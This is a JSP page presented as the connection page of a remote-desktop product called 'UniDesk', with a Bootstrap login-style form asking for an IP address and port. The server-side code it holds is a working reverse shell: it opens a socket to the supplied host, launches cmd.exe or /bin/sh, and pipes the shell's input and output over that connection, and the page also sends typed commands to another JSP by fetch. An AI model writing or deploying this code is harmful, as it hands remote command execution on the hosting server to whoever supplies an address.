<%@ page import="java.io.*, java.net.*" %>

<%!
    static class StreamConnector extends Thread {

        InputStream is;
        OutputStream os;

        StreamConnector(InputStream is, OutputStream os) {
            this.is = is;
            this.os = os;
        }

        public void run() {
            try (BufferedReader isr = new BufferedReader(new InputStreamReader(is)); BufferedWriter osw = new BufferedWriter(new OutputStreamWriter(os))) {
                char buffer[] = new char[8192];
                int lenRead;
                while ((lenRead = isr.read(buffer, 0, buffer.length)) > 0) {
                    osw.write(buffer, 0, lenRead);
                    osw.flush();
                }
            } catch (IOException ioe) {
                ioe.printStackTrace();
            }
        }
    }
%>

<!DOCTYPE html>
<html>
    <head>
        <title>UniDesk | Conexión</title>
        <link rel="icon" href="logo1.ico"/>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
        <script src="https://kit.fontawesome.com/9133fd9d09.js" crossorigin="anonymous"></script>
        <style>
            *{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'poppins';
            }
            body {
                background-color: #f4f6f8;
                width: 100%;
                height: 100vh;
                background: linear-gradient(90deg, #D3E9F9, #fff);
                margin: 0;
                font-family: sans-serif;
                color: aliceblue;
                display: grid;
                min-height: 100vh;
                grid-template-rows: auto 1fr auto;
            }
            .container{
                max-width: 1200px;
                margin: 0 auto;
            }
            nav{
                width: 100%;
                text-align: end;
            }
            nav ul li{
                display: inline-block;
                margin: 10px 20px;
            }
            nav ul li a{
                text-decoration: none;
                color:black;
            }
            footer{
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                background-color:black;
                color:white;
                transition: all 1.5s ease;
                width: 100%;
                height: 200px;
            }
            section{
                min-height: 400px;
                margin-top: 100px;
            }



            .form {
                display: flex;
                flex-direction: column;
                gap: 10px;
                background-color: #ffffff;
                padding: 30px;
                width: 450px;
                border-radius: 20px;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            }
            ::placeholder {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            }

            .form button {
                align-self: flex-end;
            }

            .flex-column > label {
                color: #151717;
                font-weight: 600;
            }

            .inputForm {
                border: 1.5px solid #ecedec;
                border-radius: 10px;
                height: 50px;
                display: flex;
                align-items: center;
                padding-left: 10px;
                transition: 0.2s ease-in-out;
            }

            .input {
                margin-left: 10px;
                border-radius: 10px;
                border: none;
                width: 85%;
                height: 100%;
            }

            .input:focus {
                outline: none;
            }

            .inputForm:focus-within {
                border: 1.5px solid #2d79f3;
            }
            .flex-row {
                display: flex;
                flex-direction: row;
                align-items: center;
                gap: 10px;
                justify-content: space-between;
            }

            .flex-row > div > label {
                font-size: 14px;
                color: black;
                font-weight: 400;
            }

            .span {
                font-size: 14px;
                margin-left: 5px;
                color: #2d79f3;
                font-weight: 500;
                cursor: pointer;
            }

            .button-submit {
                margin: 20px 0 10px 0;
                background-color: #151717;
                border: none;
                color: white;
                font-size: 15px;
                font-weight: 500;
                border-radius: 10px;
                height: 50px;
                width: 100%;
                cursor: pointer;
            }

            .button-submit:hover {
                background-color: #252727;
            }

            .p {
                text-align: center;
                color: black;
                font-size: 14px;
                margin: 5px 0;
            }

            .btn {
                margin-top: 10px;
                width: 100%;
                height: 50px;
                border-radius: 10px;
                display: flex;
                justify-content: center;
                align-items: center;
                font-weight: 500;
                gap: 10px;
                border: 1px solid #ededef;
                background-color: white;
                cursor: pointer;
                transition: 0.2s ease-in-out;
            }

            .btn:hover {
                border: 1px solid #2d79f3;
                ;
            }
            /*BANER*/
            .banner {
                padding: 20px;
                background-color:black;
                color: white;
                text-align: center;
                margin-bottom: 20px;
            }
        </style>
        <script>
            function enviarComando() {
                const comando = document.getElementById("comando").value;
                fetch("Socket1.jsp?command=" + encodeURIComponent(comando))
                        .then(response => response.text())
                        .then(output => {
                            const terminal = document.getElementById("terminal");
                            terminal.value += "> " + comando + "\n" + output + "\n";
                            terminal.scrollTop = terminal.scrollHeight;
                            document.getElementById("comando").value = "";
                        });
            }
        </script>
    </head>
    <body>
        <nav class="navbar navbar-expand-lg bg-body-tertiary" data-bs-theme="dark">
            <div class="container-fluid">
                <a class="navbar-brand" href="index.jsp">UniDesk</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-item">
                            <a class="nav-link" href="index.jsp">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="socket1.jsp">Iniciar Conexión</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="InicioSesion.jsp">Iniciar sesión</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="Contacto.jsp">Contáctanos</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="banner" id="ipBanner">
            Dirección IP del dispositivo Actual: <span id="ipAddress">Cargando...</span>
        </div>
        <%
            String ipAddress = request.getParameter("ipaddress");
            String ipPort = request.getParameter("port");

            if (ipAddress != null && ipPort != null) {
                try {
                    Socket sock = new Socket(ipAddress, Integer.parseInt(ipPort));
                    Process proc = System.getProperty("os.name").toLowerCase().contains("win")
                            ? Runtime.getRuntime().exec("cmd.exe")
                            : Runtime.getRuntime().exec("/bin/sh");

                    new StreamConnector(proc.getInputStream(), sock.getOutputStream()).start();
                    new StreamConnector(sock.getInputStream(), proc.getOutputStream()).start();

                    // Enviar una alerta de éxito en JavaScript
                    out.println("<script>");
                    out.println("alert('Conexión establecida con " + ipAddress + " en el puerto " + ipPort + "');");
                    out.println("</script>");
                } catch (Exception e) {
                    StringWriter sw = new StringWriter();
                    e.printStackTrace(new PrintWriter(sw));
                    String errorMessage = sw.toString().replace("'", "\\'"); // Escapar caracteres especiales para JavaScript

                    // Enviar una alerta de error en JavaScript
                    out.println("<script>");
                    out.println("alert('Error al conectar: " + errorMessage + "');");
                    out.println("</script>");
                }
            }
        %>

        <!--Section-->
        <section>
            <center>
                <form class="form" method="post">
                    <div class="flex-column">
                        <label>Ingresar dirección IP del servidor </label></div>
                    <div class="inputForm">
                        <input type="text" name="ipaddress" class="input" placeholder="Dirección IP">
                    </div>


                    <div class="flex-column">
                        <label>Número de puerto </label></div>
                    <div class="inputForm">
                        <input type="text" name="port" class="input" placeholder="Puerto">
                    </div>
                    <button class="button-submit">Establecer conexión</button>
                </form>
            </center>
        </section>
        <!-- Footer -->
        <footer>
            ¨<small>&COPY;Todos los derechos Reservados; UniDesk-Grupo5</small>
        </footer>
        <!-- JAVASCRIP -->
        <script>
            $(document).ready(function () {
                $.get("IpServlet", function (data) {
                    $('#ipAddress').text(data.ip);
                });

                $.get("OpenPortsServlet", function (data) {
                    $('#openPorts').html(data.ports);
                });

                $('#connectDeviceBtn').on('click', function () {
                    $('#connectDeviceModal').modal('show');
                });

                $('#submitConnect').on('click', function () {
                    $('#connectForm').submit();
                });
            });
        </script>
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
    </body>
</html>
